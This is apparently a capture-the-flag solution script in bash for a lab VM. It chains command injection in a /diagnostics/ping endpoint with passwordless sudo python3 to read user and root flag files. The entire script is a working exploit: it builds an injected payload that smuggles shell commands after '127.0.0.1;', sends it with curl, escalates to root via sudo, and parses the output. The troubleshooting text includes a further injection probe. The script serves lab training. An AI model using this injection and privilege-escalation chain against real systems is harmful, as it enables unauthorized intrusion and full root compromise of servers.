#!/usr/bin/env bash
#
# Retrieve both OS-layer flags in one request, without an interactive shell.
# Chain: /diagnostics/ping command injection -> www-data -> sudo python3 -> root.
# Authorised lab use only.
#
# Usage:
#   bash get-os-flags.sh http://VM_IP
#   BASE_URL=http://VM_IP VERBOSE=1 bash get-os-flags.sh

set -euo pipefail

BASE="${1:-${BASE_URL:-http://127.0.0.1}}"
BASE="${BASE%/}"

if ! command -v curl >/dev/null 2>&1; then
  echo "ERROR: curl is required." >&2
  exit 1
fi

# A quoted heredoc keeps both quote styles intact inside the injected command.
PAYLOAD=$(cat <<'EOF'
127.0.0.1; echo __USER_FLAG__; cat /home/forge/user.txt; echo __ROOT_FLAG__; sudo -n /usr/bin/python3 -c "import os; os.system('cat /root/root.txt')"; echo __END__
EOF
)

echo "Target: $BASE"
echo "Sending command-injection + sudo payload ..."

RESPONSE="$(curl -sS --get --data-urlencode "host=$PAYLOAD" \
  "$BASE/diagnostics/ping")" || {
    echo "ERROR: request failed. Check the target and that /diagnostics is reachable." >&2
    exit 1
  }

USER_FLAG="$(printf '%s\n' "$RESPONSE" \
  | sed -n '/__USER_FLAG__/,/__ROOT_FLAG__/p' \
  | grep -oE 'THM\{[^}]*\}' | head -1 || true)"

ROOT_FLAG="$(printf '%s\n' "$RESPONSE" \
  | sed -n '/__ROOT_FLAG__/,/__END__/p' \
  | grep -oE 'THM\{[^}]*\}' | head -1 || true)"

echo
echo "== OS flags =="
printf '%-12s %s\n' "user.txt:" "${USER_FLAG:-NOT FOUND}"
printf '%-12s %s\n' "root.txt:" "${ROOT_FLAG:-NOT FOUND}"

if [[ "${VERBOSE:-0}" == "1" ]]; then
  echo
  echo "== Raw response =="
  printf '%s\n' "$RESPONSE"
fi

if [[ -z "$USER_FLAG" || -z "$ROOT_FLAG" ]]; then
  echo
  echo "Troubleshooting:" >&2
  echo "  - Injection check: curl -sS --get --data-urlencode 'host=127.0.0.1; id' $BASE/diagnostics/ping" >&2
  echo "  - Expected UID: uid=33(www-data)" >&2
  echo "  - On the VM: sudo -n -l (must list NOPASSWD: /usr/bin/python3)" >&2
  echo "  - Re-run with VERBOSE=1 to see the raw response." >&2
  exit 1
fi
